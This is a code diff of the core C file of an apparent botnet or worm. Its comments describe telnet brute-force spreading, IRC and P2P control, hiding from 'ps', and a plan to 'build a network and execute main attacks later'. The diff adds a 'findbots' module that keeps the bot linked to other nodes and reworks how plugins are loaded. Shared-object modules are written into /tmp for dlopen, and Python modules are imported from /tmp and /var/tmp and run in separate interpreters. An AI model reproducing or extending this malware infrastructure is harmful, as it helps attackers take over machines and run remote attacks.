@@ -121,18 +121,14 @@ so nodes can use several communication methods, and irc can be used to control
 #include "modules/data/data.h"
 // management
 #include "modules/management/management.h"
+// find bots / resilency
+#include "modules/findbots/findbots.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 #define MIN(a, b) ((a) < (b) ? ( a) : (b))
 
 Modules *module_list = NULL;
 SpyFuncs *spy_list = NULL;
-
-// external modules that can be loaded from P2P, etc
-// i wanna launch this soon... this will allow me to build a network
-// and execute main attacks later..
-// external module will get pointers to everything, and ability to modify, spy, etc
-ExternalModules *external_list = NULL;
 
 // our IP passed from telnet module during brute force/worm
 char my_ip[16] = "\0";
@@ -732,7 +728,7 @@ char *QueueParseAscii(Queue *qptr, int *size) {
     return ret;
 }
 
-int ExternalExecutePython(int id, char *script, char *func_name, PyObject *pVars);
+int ExternalExecutePython(Modules *eptr, char *script, char *func_name, PyObject *pVars);
 
 // main loop of the application.. iterate and execute each module
 // ive made it easy to pass a list argument so modules themselves can
@@ -766,14 +762,6 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
 
     }
     
-    // now we must take care of our external modules
-    for (eptr = external_list; eptr != NULL; eptr = eptr->next) {
-        if (eptr->type == MODULE_TYPE_SO) {
-            eptr->plumbing(_module_list, NULL, 0, 0);
-        } else if (eptr->type == MODULE_TYPE_PYTHON) {
-            ExternalExecutePython(eptr->id, NULL, "loop", NULL);
-        }
-    }
     // lets calculate how much time to sleep.. if we have connections
     // then we wanna execute faster..    
     //*sleep_time = c - MIN((active_count * 250000), 750000);
@@ -831,11 +819,34 @@ Connection *tcp_listen(Modules *mptr, int port) {
     ret->list = &mptr->connections;
     ret->addr = dst.sin_addr.s_addr;
     ret->state = TCP_LISTEN;
+    
     printf("listen  fd %d port %d\n", fd, port);
     
     return ret;
 }
 
+// custom variables for a python module
+typedef struct _python_module_custom {
+    // so we can verify its the correct structure..
+    int size;
+    // if python... this allows to easily kill the script
+    PyThreadState *python_thread;
+    PyObject *pModule;
+} PythonModuleCustom;
+
+// not sure if this is necessary.. it could be downright bad..
+// connections already have this inside of some modules..
+void *CustomPtr(Connection *cptr, int custom_size) {
+    if (cptr->buf == NULL) {
+        if ((cptr->buf = (char *)calloc(custom_size + 1, 1)) == NULL)
+            return NULL;        
+    }
+
+    return (void *)cptr->buf;
+}
+
+
+// finds a connection by its destination address
 Connection *ConnectionByDST(Modules *mptr, uint32_t dst) {
     Connection *cptr = mptr->connections;
     
@@ -980,29 +991,6 @@ Node *node_add(Modules *note, uint32_t addr) {
     return nptr;
 }
 
-// retrieve a custom function for a particular module
-int ModuleCustomFunc(Modules *mptr, Connection *cptr, char *buf, int size, int num) {
-    module_func function = NULL;
-    
-    // if custom functions dont exiist..
-    if (mptr->custom_functions == NULL) return -1;
-    
-    function = (module_func)mptr->custom_functions[num];
-    return function(mptr, cptr, buf, size);
-}
-
-// retrieve a custom function for a particular module
-// handles type PTR (for particular module functions which pass pointers)
-int ModuleCustomFuncPtr(Modules *mptr, Connection *cptr, char **buf, int *size, int num) {
-    module_func_ptr function = NULL;
-    
-    // if custom functions dont exiist..
-    if (mptr->custom_functions == NULL) return -1;
-    
-    function = (module_func_ptr)mptr->custom_functions[num];
-    return function(mptr, cptr, buf, size);
-}
-
 // add a set of 'spy' functions to monitor a modules messages
 int SpyAdd(Modules *mptr, ModuleFuncs *funcs) {
     SpyFuncs *sptr = NULL;
@@ -1031,57 +1019,51 @@ int various_init() {
 }
 
 
-// searches for an externally added module by its identifier
-ExternalModules *ExternalFind(ExternalModules *external_module_list, int id) {
-    ExternalModules *eptr = external_module_list;
+int python_module_deinit(Modules *mptr) {
+    PythonModuleCustom *evars = (PythonModuleCustom *)ModuleCustomPtr(mptr, sizeof(PythonModuleCustom));
     
-    if (eptr == NULL) eptr = external_list;
+    if (evars == NULL) return -1;
     
-    while (eptr != NULL) {
-        if (eptr->id == id) break;
-        eptr = eptr->next;
-    }
-    
-    return eptr;
+    if (evars->python_thread)
+        Py_EndInterpreter(evars->python_thread);
+        
+    return 0;
 }
-
 
 
 // deinitialize an external module
-int ExternalDeinit(ExternalModules *eptr) {
+int ModuleDeinit(Modules *eptr) {
     int ret = 0;
-    if (eptr->plumbing == NULL) return 0;
     
-    ret = eptr->deinit();
+    if (eptr->outfd == 0) return 0;
     
+    ret = python_module_deinit(eptr);
+    /*
     if (ret == 1) {
         if (eptr->type == MODULE_TYPE_SO) {
-        // close dl handle
+            // close dl handle
             if (eptr->dl_handle)
-                dlclose(eptr->dl_handle);
-            
-        } else if (eptr->type == MODULE_TYPE_PYTHON) {
-            // nothing as of now. maybe add ability for python to know its being unloaded later..
-            // ***
+                dlclose(eptr->dl_handle);   
         }
+        
         // close file descriptor
         close(eptr->outfd);
         // null out plumbing so we know its not initialized
-        eptr->plumbing = NULL;
-        
+        eptr->outfd = 0;
     }
-
-    if (eptr->plumbing == NULL) return 0;
+*/
+    if (eptr->outfd == 0) return 0;
         
     return 1;    
 }
+
 
 // initialize an external module
 // need to write to a file..
 // we will open a temp file, and then delete it
 // then we can open it by the file descriptor using dlopen
 // after that we can dlsym from that handle and everything will be fine
-int ExternalInit(ExternalModules *eptr) {
+int ModuleInit(Modules *eptr) {
   int write_fd = 0;
   int i = 0;
   int ret = -1;
@@ -1093,15 +1075,15 @@ int ExternalInit(ExternalModules *eptr) {
   void *_init = NULL;
   void *_deinit = NULL;
   void *_plumbing = NULL;
+  PythonModuleCustom *evars = NULL;
   
-  if (eptr->plumbing != NULL) {
+  if (eptr->type == MODULE_TYPE_PYTHON) {
       // first we must deinit it..
-      if (ExternalDeinit(eptr) == 0)
+      if (ModuleDeinit(eptr) == 0)
         return ret;
-
-      eptr->plumbing = NULL;
   }
   
+  /*
   // now we can init it..
   if ((tmpname = tempnam("/tmp", ".so")) == NULL)
     return ret;
@@ -1141,9 +1123,21 @@ int ExternalInit(ExternalModules *eptr) {
             // execute the module's initialization routine
             ret = eptr->init();
         }
-     } else if (eptr->type == MODULE_TYPE_PYTHON) {
+     } else if (eptr->type == MODULE_TYPE_PYTHON) {         
+        evars = (PythonModuleCustom *)ModuleCustomPtr(eptr, sizeof(PythonModuleCustom));
+        if (evars != NULL) {
+
+            // we must initialize a new python interpreter...
+            // i wasnt goign to do this but to be able to kill the thread at any time..
+            // requires it to happens
+            evars->python_thread = Py_NewInterpreter();
+
             // python is fairly simple..
-            ret = ExternalExecutePython(eptr->id, filename, "init", NULL);       
+            ret = ExternalExecutePython(eptr, filename, "init", NULL);
+ 
+            // need to do this at the end..           
+            //Py_EndInterpreter(python_handle)
+        }
      } 
   }
   
@@ -1155,109 +1149,24 @@ int ExternalInit(ExternalModules *eptr) {
       eptr->plumbing = NULL;
         
       close(eptr->outfd);
-  }
+  }*/
   
   return ret;
 }
 
 
-// adds an external function to the list (and initializes it)
-// to be used from P2P, etc.. passes the file data, and size
-ExternalModules *ExternalAdd(ExternalModules **external_module_list, int type, int id, char *buf, int size, int initialize) {
-    int ret = 0;
-    ExternalModules *eptr = NULL;
-    
-    // following is hack due to botlink not having a passed pointer
-    // to external module list..
-    if (eptr == NULL) {
-        eptr = ExternalFind(external_list, id);
-    } else {
-        eptr = ExternalFind(*external_module_list, id);
-    }
-    
-    if (eptr != NULL) {
-        if (eptr->buf != NULL) {
-            free(eptr->buf);
-            eptr->buf = NULL;
-        }
-    } else {
-        if ((eptr = (ExternalModules *)L_add((LIST **)external_module_list, sizeof(ExternalModules))) == NULL)
+// allocates custom data for a module..
+// this is so python.h doesnt have to be loaded in every source file
+void *ModuleCustomPtr(Modules *eptr, int custom_size) {
+    if (eptr->buf == NULL) {
+        if ((eptr->buf = (char *)calloc(1,custom_size + 1)) == NULL) {
             return NULL;
-            
-        eptr->id = id;
+        }
     }
     
-    eptr->type = type;
-    eptr->size = size;
-    
-    if ((eptr->buf = (char *)malloc(size + 1)) == NULL) {
-        L_del((LIST **)&external_list, (LIST *)eptr);
-        return NULL;
-    }
-    
-    // fit the module in the buffer..
-    memcpy(eptr->buf, buf, size);
-    
-    if (initialize) {
-        // now we must initialize the module   
-        ret = ExternalInit(eptr);
-    } else {
-        ret = 1;
-    }
-    
-    return eptr;
+    return (void *)eptr->buf;
 }
 
-void *CustomPtr(Connection *cptr, int custom_size) {
-    if (cptr->buf == NULL) {
-        if ((cptr->buf = (char *)calloc(custom_size + 1, 1)) == NULL)
-            return NULL;        
-    }
-
-    return (void *)cptr->buf;
-}
-
-
-
-typedef struct _python_varsa {
-    struct _python_varsa *next;
-    
-    int id;
-    PyObject *pModule = NULL;
-} PythonVarsA;
-
-
-PythonVarsA *pyvars_list = NULL;
-
-PythonVarsA *ExtVarsFind(int id) {
-    PythonVarsA *pptr = pyvars_list;
-    
-    while (pptr != NULL) {
-        if (pptr->id == id) break;
-    }
-    
-    return pptr;
-}
-
-PythonVarsA *ExtVars(int id) {
-    PythonVarsA *pptr = ExtVarsFind(id);
-
-    if (pptr != NULL) return pptr;
-    
-    // first time running.. ever
-    if (pyvars_list == NULL) {
-#ifndef NO_PYTHON_MODULES
-        Py_Initialize();
-#endif       
-    }
-    pptr = (PythonVarsA *)L_add((LIST **)&pyvars_list, sizeof(PythonVarsA));
-    pptr->id = id;
-
-    pptr->next = (PythonVarsA *)pyvars_list;
-    pyvars_list = pptr;
-
-    return pptr;    
-}
 
 
 // execute a python function from a file..
@@ -1273,21 +1182,22 @@ PythonVarsA *ExtVars(int id) {
 // i suggest using the function externally to test..
 // argument can be NULL.. or it can give the argument :)
 // *** todo: maybe separate python execution environments for each script..
-int ExternalExecutePython(int id, char *script_file, char *func_name, PyObject *pArgs) {
+int PythonModuleExecute(Modules *eptr, char *script_file, char *func_name, PyObject *pArgs) {
 #ifndef NO_PYTHON_MODULES
     PyObject *pName=NULL, *pModule=NULL, *pFunc=NULL;
     PyObject *pValue=NULL;
     int ret = 0;
-    PythonVarsA *pptr = ExtVars(id);
     char fmt[] = "sys.path.append(\"%s\")";
     char *dirs[] = { "/tmp", "/var/tmp", ".", NULL };
     char buf[1024];
     int i = 0;
+    PythonModuleCustom *evars = (PythonModuleCustom *)ModuleCustomPtr(eptr, sizeof(PythonModuleCustom));
     
-    if (pptr == NULL) return -1;
+    if (evars == NULL) return -1;
     
-
-    if (!pptr->pModule) {
+    PyEval_AcquireThread(evars->python_thread);
+    
+    if (!evars->pModule) {
         // initialize python paths etc that we require for operating
         PyRun_SimpleString("import sys");
         for (i = 0; dirs[i] != NULL; i++) {
@@ -1301,10 +1211,10 @@ int ExternalExecutePython(int id, char *script_file, char *func_name, PyObject *
         pModule = PyImport_Import(pName);
         Py_DECREF(pName);
         // keep for later (for the plumbing/loop)
-        pptr->pModule = pModule;
+        evars->pModule = pModule;
     }
     
-    pModule = pptr->pModule;
+    pModule = evars->pModule;
     if (pModule == NULL) goto end;
     
     // we want to execute a particular function under this module we imported
@@ -1330,57 +1240,20 @@ end:;
     if (pValue != NULL)
         Py_XDECREF(pValue);
 
+    PyEval_ReleaseThread(evars->python_thread);
+
     return ret;
 #else
     return -1;
 #endif
 }
 
-
-// the way connections are handled using ConnectionBad, etc.. gives us ability to easily
-// make a STACK based Connection structure to pass information to the appropriate module we are attempting object
-// for moving information from botlink to irc, etc
-int MessageModule(int module_id, Modules *module_list, ExternalModules *external_module_list, char *message, int size) {
-    Modules *mptr = module_list;
-    ExternalModules *eptr = external_module_list;
-    Connection temp_conn;
+int python_sendmessage(Modules *mptr, Connection *cptr, char *message, int size) {
     int ret = -1;
 #ifndef NO_PYTHON_MODULES
     PyObject *pArgs = NULL;
     PyObject *pMessage = NULL;
     PyObject *pValue = NULL;
-#endif
-    
-    // set an empty connection structure.. its just to not crash when the modules attempt to adjust it
-    memset(&temp_conn, 0, sizeof(Connection));
-    // later it may be useful to get the address of the IRC client giving the command, etc
-    // that could be returned back in an array, and converted and passed into the client structure here
-    
-    // first we check if the module exists within the normal set of modules (compiled in)
-    while (mptr != NULL) {
-        if (mptr->id == module_id) {
-            break;
-        }
-        mptr = mptr->next;
-    }
-    
-    if (mptr == NULL)
-    while (eptr != NULL) {
-        if (eptr->id == module_id) {
-            break;
-        }
-        eptr = eptr->next;
-    }
-    
-    // at this point either mptr = the module, or eptr = the module.. not both
-    if (mptr) {
-        // process it inside of the module
-        ret = mptr->functions->incoming(mptr, &temp_conn, message, size);
-    }   
-    
-    if (eptr) {
-        // need to call a custom eptr function giving it the messages..
-        // *** not created yet
         
         // first we must create the arguments
 	    // setup and convert arguments for python script
@@ -1398,7 +1271,7 @@ int MessageModule(int module_id, Modules *module_list, ExternalModules *external
                     PyTuple_SetItem(pArgs, 2, pValue);
                     
                     // now push that argument to the actual python 'incoming' function in that script
-                    ret = ExternalExecutePython(eptr->id, NULL, "incoming", pArgs);
+                    ret = PythonModuleExecute(mptr, NULL, "incoming", pArgs);
                     
                     // free size
                     Py_DECREF(pValue);
@@ -1409,10 +1282,43 @@ int MessageModule(int module_id, Modules *module_list, ExternalModules *external
             // free tuple
             Py_DECREF(pArgs);
         }
-    }
-    
+#endif
     return ret;
 }
+
+// the way connections are handled using ConnectionBad, etc.. gives us ability to easily
+// make a STACK based Connection structure to pass information to the appropriate module we are attempting object
+// for moving information from botlink to irc, etc
+int MessageModule(int module_id, Modules *module_list, char *message, int size) {
+    Modules *mptr = module_list;
+    Connection temp_conn;
+    int ret = -1;
+    
+    // set an empty connection structure.. its just to not crash when the modules attempt to adjust it
+    memset(&temp_conn, 0, sizeof(Connection));
+    // later it may be useful to get the address of the IRC client giving the command, etc
+    // that could be returned back in an array, and converted and passed into the client structure here
+    
+    // first we check if the module exists within the normal set of modules (compiled in)
+    while (mptr != NULL) {
+        if (mptr->id == module_id) {
+            break;
+        }
+        
+        mptr = mptr->next;
+    }
+        
+    // now use the modules correct function to send the message
+    if (mptr) {
+        if (mptr->type == MODULE_TYPE_SO)
+            ret = mptr->functions->incoming(mptr, &temp_conn, message, size);
+        else if (mptr->type == MODULE_TYPE_PYTHON)
+            ret = python_sendmessage(mptr, &temp_conn, message, size);
+    }   
+        
+    return ret;
+}
+
 
 
 // we will use a simple main in the beginning...
@@ -1441,8 +1347,9 @@ int main(int argc, char *argv[]) {
     
     // fake name for 'ps'
     //fakename_init(&module_list, argv, argc);
-    
-    //PySys_SetArgv(argc, argv);    
+    // find bots to ensure connectivity to other nodes
+    findbots_init(&module_list);
+     
     // main loop
     while (1) {
         Modules_Execute(module_list, &sleep_time);
@@ -1451,7 +1358,26 @@ int main(int argc, char *argv[]) {
         //sleep(5);
     }
 #ifndef NO_PYTHON_MODULES    
-    if (pyvars_list != NULL)
-        Py_Finalize();
+    Py_Finalize();
 #endif        
+}
+
+Modules *ModuleFind(Modules *mod_list, int id) {
+    Modules *mptr = NULL;
+    
+    // use either the module list they passed, or the global one..
+    if (mod_list != NULL) {
+        mptr = mod_list;
+    } else {
+        mptr = module_list;
+    }
+    
+    while (mptr != NULL) {
+        if (mptr->id == id)
+            break;
+
+        mptr = mptr->next;
+    }
+    
+    return mptr;
 }
